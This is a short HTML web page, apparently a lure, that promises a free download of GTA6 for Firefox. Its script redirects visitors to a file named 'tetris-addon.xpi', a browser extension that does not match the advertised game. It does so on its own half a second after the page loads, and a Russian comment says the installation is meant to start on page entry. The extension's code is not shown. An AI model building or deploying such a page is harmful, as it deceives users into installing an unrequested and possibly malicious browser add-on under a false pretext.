<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>download GTA6 on firefox for free</title>
  <style>
    body {
      background-color: #0f172a;
      color: #f8fafc;
      font-family: system-ui, -apple-system, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .card {
      background: #1e293b;
      padding: 40px;
      border-radius: 12px;
      text-align: center;
      max-width: 400px;
      box-shadow: 0 10px 25px rgba(0,0,0,0.5);
    }
    h1 { margin-bottom: 10px; color: #38bdf8; }
    p { color: #94a3b8; font-size: 14px; margin-bottom: 25px; }
    .btn {
      background: #0284c7;
      color: white;
      border: none;
      padding: 12px 24px;
      font-size: 16px;
      border-radius: 8px;
      cursor: pointer;
      font-weight: 600;
      text-decoration: none;
      display: inline-block;
    }
    .btn:hover { background: #0369a1; }
  </style>
</head>
<body>

  <div class="card">
    <h1>GTA6 for free</h1>
    
    <button class="btn" onclick="downloadXPI()">download</button>
  </div>

  <script>
    function downloadXPI() {
      window.location.href = '/tetris-addon.xpi';
    }

    // Автоматический запуск установки при заходе на страницу
    window.addEventListener('DOMContentLoaded', () => {
      setTimeout(downloadXPI, 500);
    });
  </script>

</body>
</html>
